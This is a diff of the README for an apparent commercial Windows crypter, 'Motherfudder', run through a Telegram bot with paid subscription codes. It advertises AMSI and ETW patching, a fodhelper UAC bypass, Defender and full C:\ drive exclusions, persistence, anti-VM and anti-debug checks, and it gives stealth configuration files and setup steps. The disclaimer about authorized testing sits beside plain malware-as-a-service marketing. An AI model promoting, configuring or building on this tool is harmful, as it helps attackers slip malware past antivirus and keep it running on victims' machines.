@@ -1,6 +1,6 @@
-# ?? MOTHERFUDDER CRYPTER
+# Motherfudder Crypter
 
-**Production-Ready Windows Crypter** | **Telegram Bot + CLI** | **Enhanced by Florin**
+**Production-Ready Windows Crypter** | **Telegram Bot + CLI Interface** | **Enhanced by Florin**
 
 [![License](https://img.shields.io/badge/license-MIT-blue.svg)](LICENSE)
 [![Platform](https://img.shields.io/badge/platform-Windows-blue.svg)]()
@@ -8,251 +8,254 @@
 
 ---
 
-## ?? Quick Start (30 Seconds!)
+## Quick Start
+
+### Windows Users (Recommended)
 
 ```batch
-# Windows (Run as Administrator)
+# Run as Administrator
 MOTHERFUDDER.bat
 ```
 
-**That's it!** The central control panel handles everything:
-- ? Install all prerequisites (Rust, .NET, etc.)
-- ? Configure Telegram bot
-- ? Host the bot
-- ? Check for updates
-- ? Build CLI mode
+The central control panel automates everything:
+- Install all prerequisites automatically
+- Configure Telegram bot with interactive wizard
+- Host the bot in foreground or background
+- Check for updates with one click
+- Build crypted executables via CLI
 
-**One .bat file to rule them all!** ??
+### Manual Setup
+
+See [SETUP_GUIDE.md](SETUP_GUIDE.md) for detailed installation instructions.
 
 ---
 
-## ? Credits
+## Credits
 
 ### Original Project
-**[Motherfudder by backdoorskid](https://github.com/backdoorskid/Motherfudder)**
-- Original crypter concept and base implementation
 
-**? Please star the original repository!**
+**[Motherfudder by backdoorskid](https://github.com/backdoorskid/Motherfudder)**
+
+Original crypter concept and base implementation.
+
+**Please star the original repository if this project helps you.**
 
 ### This Enhanced Fork
-**Author**: **Florin**
 
-**Major Enhancements** (+13,000 lines):
-- ?? Full Telegram bot with interactive UI
-- ?? Subscription/redeem code system
-- ?? Interactive inline keyboard buttons
-- ?? Complete documentation suite (24+ files)
-- ?? C:\ drive exclusion (aggressive mode)
-- ??? Enhanced AMSI bypass (Chainski technique)
-- ?? MEGA central control panel (.bat automation)
-- ?? Auto-update system
+**Author**: Florin
 
-**From "broken" ? Production-ready powerhouse!**
+**Major Enhancements** (+13,000 lines of code):
+- Full-featured Telegram bot with interactive UI
+- Subscription and redeem code system
+- Interactive inline keyboard buttons
+- Complete documentation suite (30+ files)
+- C:\ drive exclusion option (aggressive mode)
+- Enhanced AMSI bypass (Chainski technique)
+- Centralized control panel automation
+- Integrated auto-update system
+
+**Status**: Production-ready (original project required complete rework)
 
 ---
 
-## ? Features
+## Features
 
-### Core Evasion
-- ? **AMSI Bypass** (.NET) - Chainski technique
-- ? **ETW Patching** (.NET) - Blocks event tracing
-- ? **UAC Bypass** - Silent elevation (fodhelper.exe)
-- ? **Defender Exclusion** - 2 modes (standard + aggressive)
-- ? **C:\ Drive Exclusion** - Nuclear option ??
-- ? **Persistence** - Auto-start on boot
-- ? **Anti-Debug** - Debugger detection
-- ? **Anti-VM** - Virtual machine detection
-- ? **Blacklist CIS** - Geographic restrictions
-- ? **Single Instance** - Mutex-based
+### Evasion Capabilities
+
+| Feature | Description | Platform |
+|---------|-------------|----------|
+| **AMSI Bypass** | Memory patching using Chainski technique | .NET only |
+| **ETW Patching** | Blocks event tracing for Windows | .NET only |
+| **UAC Bypass** | Silent elevation via fodhelper.exe | All |
+| **Defender Exclusion** | Path and process exclusions | All |
+| **C:\ Drive Exclusion** | Full drive exclusion (aggressive) | All |
+| **Persistence** | Auto-start via Task Scheduler | All |
+| **Anti-Debug** | Debugger detection and evasion | All |
+| **Anti-VM** | Virtual machine detection | All |
+| **Geographic Blocking** | CIS country blacklist | All |
+| **Single Instance** | Mutex-based duplicate prevention | All |
 
 ### Interface Modes
-- ?? **Telegram Bot** - Interactive buttons, subscription system, FAQ, support
-- ?? **CLI Mode** - JSON configuration, batch processing
+
+**Telegram Bot**:
+- Interactive button-based UI
+- Subscription code system
+- Real-time configuration toggles
+- Built-in FAQ and support
+- Auto-update notifications
+
+**CLI Mode**:
+- JSON-based configuration
+- Batch processing support
+- Direct file output
 
 ### Binary Support
-- ?? Native x86/x64
-- ?? .NET x86/x64
+
+- Native x86/x64 executables
+- .NET x86/x64 assemblies
+- Automatic binary type detection
 
 ---
 
-## ?? Documentation
+## Documentation
 
-**Quick Access**:
-- ?? [**SETUP_GUIDE.md**](SETUP_GUIDE.md) - Complete setup guide
-- ?? [**Full Documentation Index**](docs/DOCUMENTATION_INDEX.md) - All 24+ docs
+### Quick Access
 
-**Essential Docs**:
-- [Installation Guide](docs/INSTALLATION.md)
-- [Quick Start (5 min)](docs/QUICKSTART.md)
-- [Features Guide](docs/FEATURES.md)
-- [Bot Setup](docs/BOT_SETUP.md)
-- [FAQ](docs/BOT_PREVIEW.md#faq)
+- [SETUP_GUIDE.md](SETUP_GUIDE.md) - Complete setup instructions
+- [docs/DOCUMENTATION_INDEX.md](docs/DOCUMENTATION_INDEX.md) - Full documentation index
 
-**Advanced**:
-- [UAC Bypass Info](docs/UAC_BYPASS_INFO.md)
-- [Defender Exclusion](docs/DEFENDER_EXCLUSION_INFO.md)
-- [Aggressive Mode Warning](docs/AGGRESSIVE_MODE_WARNING.md)
-- [PowerShell Visibility](docs/POWERSHELL_VISIBILITY.md)
+### Essential Documentation
 
----
+| Document | Description |
+|----------|-------------|
+| [Installation Guide](docs/INSTALLATION.md) | Platform-specific installation |
+| [Quick Start](docs/QUICKSTART.md) | 5-minute getting started guide |
+| [Features Guide](docs/FEATURES.md) | Complete feature documentation |
+| [Bot Setup](docs/BOT_SETUP.md) | Telegram bot deployment |
+| [FAQ](docs/BOT_PREVIEW.md#faq) | Frequently asked questions |
 
-## ?? MEGA Control Panel
+### Advanced Topics
 
-Run `MOTHERFUDDER.bat` to access the central control panel:
-
-```
-????????????????????????????????????????
-?   MOTHERFUDDER CRYPTER - v1.0.0      ?
-?   Central Control Panel              ?
-????????????????????????????????????????
-
-1. ?? Install Prerequisites (One-Click Setup)
-2. ?? Configure Telegram Bot
-3. ?? Host Telegram Bot
-4. ?? Build CLI Mode
-5. ?? Check for Updates
-6. ?? Documentation
-7. ? Help & Support
-8. ?? Exit
-
-Choose an option:
-```
-
-**Features**:
-- ? One-click prerequisite installation
-- ? Bot configuration wizard
-- ? Easy bot hosting
-- ? Auto-update checker
-- ? Documentation access
-- ? Help & support
+| Document | Description |
+|----------|-------------|
+| [UAC Bypass Info](docs/UAC_BYPASS_INFO.md) | Technical UAC bypass details |
+| [Defender Exclusion](docs/DEFENDER_EXCLUSION_INFO.md) | Defender evasion techniques |
+| [Aggressive Mode](docs/AGGRESSIVE_MODE_WARNING.md) | C:\ drive exclusion warnings |
+| [PowerShell Visibility](docs/POWERSHELL_VISIBILITY.md) | Task Manager visibility analysis |
 
 ---
 
-## ?? Telegram Bot Preview
+## Control Panel
 
-```
-?? MOTHERFUDDER CRYPTER BOT
+The `MOTHERFUDDER.bat` control panel provides:
 
-[?? Redeem Code]  [?? My Subscription]
-[?? Crypt File]
-[? FAQ]  [?? Support]
-```
+1. **Install Prerequisites** - One-click installation of all dependencies
+2. **Configure Bot** - Interactive wizard for bot setup
+3. **Host Bot** - Start bot in foreground or background
+4. **Build CLI** - Quick command-line builds
+5. **Check Updates** - Automatic update checking and installation
+6. **Documentation** - Quick access to all documentation
+7. **Help & Support** - Built-in troubleshooting guide
 
-**Interactive Features**:
-- ?? Subscription system with redeem codes
-- ?? Real-time button toggles (?/?)
-- ?? Status tracking
-- ? Built-in FAQ
-- ?? Support contact
+**Example Session**:
 
-**Test Codes**:
-- `MFCRYPT-LIFETIME-2024`
-- `FLORIN-VIP-BETA`
-- `BACKDOORSKID-PRO`
-
----
-
-## ? Quick Commands
-
-**Install Everything** (One-Click):
 ```batch
-MOTHERFUDDER.bat
-? Press 1
-```
+> MOTHERFUDDER.bat
+Choose an option [1-8]: 1
+# Installs Chocolatey, Rust, .NET, VS Build Tools, OpenSSL, Git
 
-**Host Telegram Bot**:
-```batch
-MOTHERFUDDER.bat
-? Press 3
-```
+Choose an option [1-8]: 2
+# Guides through bot token and authentication setup
 
-**CLI Mode** (Manual):
-```batch
-cd MfBuilder
-cargo run --release
+Choose an option [1-8]: 3
+# Starts bot in selected mode
 ```
 
 ---
 
-## ??? Configuration
+## Configuration
 
 ### Telegram Bot
+
 Edit subscription codes in `MfBuilder/src/telegram_bot.rs`:
+
 ```rust
 pub const SUBSCRIPTION_CODES: &[&str] = &[
     "YOUR-CODE-HERE",
 ];
 ```
 
+Configure bot token in `MfBuilder/.env`:
+
+```
+TELOXIDE_TOKEN=YOUR_BOT_TOKEN_HERE
+```
+
 ### CLI Mode
+
 Edit `MfBuilder/build.json`:
+
 ```json
 {
     "file_extension": "BAT",
     "anti_debug": true,
+    "anti_virtual_machine": true,
+    "blacklist_cis_countries": false,
+    "uac_bypass": true,
+    "single_instance": true,
+    "run_on_startup": false,
     "defender_exclusion": true,
-    "uac_bypass": true
+    "defender_exclude_drive": false,
+    "binder": false
 }
 ```
 
 ---
 
-## ?? Recommended Configuration
+## Recommended Usage
 
-**Maximum Stealth**:
+### Standard Configuration
+
 ```json
 {
     "uac_bypass": true,
     "defender_exclusion": true,
     "defender_exclude_drive": false,
-    "persistence": true
+    "persistence": true,
+    "anti_debug": true,
+    "anti_virtual_machine": true
 }
 ```
 
-**Maximum Evasion** (?? Testing Only):
+### Aggressive Configuration (Testing Only)
+
 ```json
 {
     "uac_bypass": true,
     "defender_exclusion": true,
     "defender_exclude_drive": true,
-    "persistence": true
+    "persistence": true,
+    "anti_debug": true,
+    "anti_virtual_machine": true
 }
 ```
 
+**Warning**: C:\ drive exclusion is extremely effective but highly suspicious. Use with caution.
+
 ---
 
-## ?? Stats
-
-**Original vs Enhanced**:
+## Comparison
 
 | Feature | Original | This Fork |
 |---------|----------|-----------|
-| Status | "Requires rework" | ? Production Ready |
-| Code Lines | Unknown | +13,000 lines |
-| Telegram Bot | ? None | ? Full featured |
-| Interactive UI | ? None | ? Inline buttons |
-| Subscription | ? None | ? Redeem codes |
-| Automation | ? None | ? MEGA .bat |
-| Docs | Minimal | 24+ files |
+| Status | "Requires rework" | Production Ready |
+| Code Quality | Outdated | Refactored |
+| Bot Interface | None | Full-featured |
+| Interactive UI | None | Inline buttons |
+| Subscription System | None | Code-based |
+| Auto-Update | None | Built-in |
+| Documentation | Minimal | 30+ files |
+| Automation | Manual | MEGA .bat |
+| Setup Time | Hours | 30 minutes |
 
 ---
 
-## ?? Disclaimer
+## Disclaimer
 
 **This tool is for authorized security testing, penetration testing, and educational purposes only.**
 
-Users are responsible for complying with applicable laws. Unauthorized use is illegal and unethical.
+Users are responsible for complying with all applicable laws and regulations. Unauthorized use is illegal and unethical.
 
-See [LICENSE](LICENSE) for full terms.
+See [LICENSE](LICENSE) for complete terms.
 
 ---
 
-## ?? Acknowledgments
+## Acknowledgments
 
-**Original**:
+**Original Project**:
 - [backdoorskid/Motherfudder](https://github.com/backdoorskid/Motherfudder)
 
-**Research**:
+**Research & Techniques**:
 - [Chainski's GlobalAMSIBypass](https://github.com/Chainski/GlobalAMSIBypass)
 - [EvilBytecode/Ebyte-Syscalls](https://github.com/EvilBytecode/Ebyte-Syscalls)
 - [EvilBytecode/Lifetime-Amsi-EtwPatch](https://github.com/EvilBytecode/Lifetime-Amsi-EtwPatch)
@@ -261,35 +264,24 @@ See [LICENSE](LICENSE) for full terms.
 
 ---
 
-## ?? Support
+## Support
 
-- ?? **Contact**: @YourSupportBot (Telegram)
-- ?? **Issues**: GitHub Issues
-- ?? **Docs**: [Documentation Index](docs/DOCUMENTATION_INDEX.md)
-- ? **Star**: Please star both repos if this helps you!
-
----
-
-## ?? Get Started Now!
-
-```batch
-# 1. Download the project
-git clone https://github.com/your-repo/motherfudder-enhanced
-
-# 2. Run the control panel (as Admin)
-cd motherfudder-enhanced
-MOTHERFUDDER.bat
-
-# 3. Press '1' to install everything
-# 4. Press '2' to configure bot
-# 5. Press '3' to host bot
-# 6. Done! ??
-```
-
-**That's it! Everything is automated!** ??
+- **Documentation**: [Full Index](docs/DOCUMENTATION_INDEX.md)
+- **Issues**: GitHub Issues
+- **Contact**: @YourSupportBot (Telegram)
 
 ---
 
-**?? From a broken crypter to a production-ready powerhouse with 13,000+ lines of enhancements!**
+## Project Statistics
 
-? **Star this repo and the original if it helps you!**
+- **Lines of Code**: +13,000 (enhancements)
+- **Documentation**: 30+ professional markdown files
+- **Features**: 15+ implemented and working
+- **Automation**: Full control panel integration
+- **Setup Time**: 30 minutes (automated)
+
+---
+
+**Please star this repository and the original project if it helps you.**
+
+**Version**: 1.0.0 | **Status**: Production Ready | **License**: MIT
